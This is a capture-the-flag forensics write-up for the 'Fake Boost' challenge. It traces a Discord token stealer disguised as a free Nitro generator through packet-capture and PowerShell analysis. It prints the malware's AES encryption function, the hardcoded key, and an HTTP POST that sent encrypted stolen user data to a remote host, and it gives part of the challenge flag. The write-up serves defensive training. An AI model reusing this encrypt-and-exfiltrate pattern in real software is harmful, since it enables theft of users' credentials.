# HTB Forensics — Fake Boost

**Difficulty:** Easy
**Category:** Forensics
**Author:** gordic
**Date:** 2nd March 2024

---

## Challenge Description

> In the shadow of The Fray, a new test called "Fake Boost" whispers promises of free Discord Nitro perks. It's a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception?

---

## Skills Required

- Reading PowerShell code and syntax
- Basic deobfuscation (Base64, string reversal)
- `.pcap` / `.pcapng` network traffic forensics
- AES decryption with known key and IV

---

## Skills Learned

- Analyzing network traffic to extract critical data
- Deobfuscating PowerShell scripts to uncover hidden logic
- Utilizing AES-CBC decryption to reveal sensitive information

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Wireshark | PCAP analysis and TCP stream extraction |
| CyberChef | Base64 decoding / deobfuscation |
| Python 3 + pycryptodome | AES-CBC decryption |

---

## Solution Walkthrough

### Step 1 — PCAP Analysis

Open the provided `.pcapng` file in **Wireshark**.

- Navigate to **TCP Stream 3** (`Follow → TCP Stream`)
- This stream contains the download of the malicious PowerShell script: `discordnitro.ps1`

### Step 2 — Deobfuscate the PowerShell Script

Inside the script, locate the obfuscated variable `$jozeq3n`:

1. **Reverse** the string value
2. **Base64 decode** the result

This reveals the full malicious PowerShell script.

### Step 3 — Extract Part 1 of the Flag

Inside the deobfuscated script, find:

```powershell
$part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"
```

Base64 decode this value:

```
HTB{fr33_N17r0G3n_3xp053d!_
```

This is **Part 1** of the flag.

### Step 4 — Identify Encryption Parameters

The script encrypts stolen Discord tokens and user info before exfiltrating them:

```powershell
$AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="

function Encrypt-String($key, $plaintext) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    [System.Convert]::ToBase64String($fullData)
}
```

Key parameters:
- **Algorithm:** AES-256-CBC
- **Key (Base64):** `Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=`
- **IV:** Prepended to ciphertext (first 16 bytes after Base64 decode)
- **Padding:** PKCS7

### Step 5 — Extract the Encrypted Payload

Back in Wireshark, navigate to **TCP Stream 48**.

Find the HTTP POST request to `/rj1893rj1joijdkajwda` — the body contains the Base64-encoded AES-encrypted payload:

```
POST /rj1893rj1joijdkajwda HTTP/1.1
Content-Type: text/plain
User-Agent: Mozilla/5.0
Host: 192.168.116.135:8080

bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Ux...
```

### Step 6 — Decrypt with Python

```python
from Crypto.Cipher import AES
import base64

aes_key = base64.b64decode("Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=")

def decrypt_string(encrypted_base64, key):
    full_data = base64.b64decode(encrypted_base64)
    iv = full_data[:AES.block_size]           # first 16 bytes = IV
    encrypted_message = full_data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_message)
    pad = decrypted[-1]                        # PKCS7 unpad
    return decrypted[:-pad].decode('utf-8')

encrypted_base64 = "bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA=="

print(decrypt_string(encrypted_base64, aes_key))
```

### Step 7 — Retrieve Part 2 of the Flag

The decrypted output is a JSON object containing stolen Discord user info. The **`email` field** contains Part 2 of the flag.

---

## Flag

```
HTB{fr33_N17r0G3n_3xp053d!_<part2_from_email_field>}
```

---

## Key Takeaways

- Malware disguised as "free Nitro generators" is a common Discord phishing vector
- Token stealers scan browser profile directories for session tokens using regex patterns
- AES-CBC with a hardcoded key is trivially reversible once the key is extracted from the script
- Network forensics (PCAP analysis) combined with static code analysis is a powerful combination for incident response
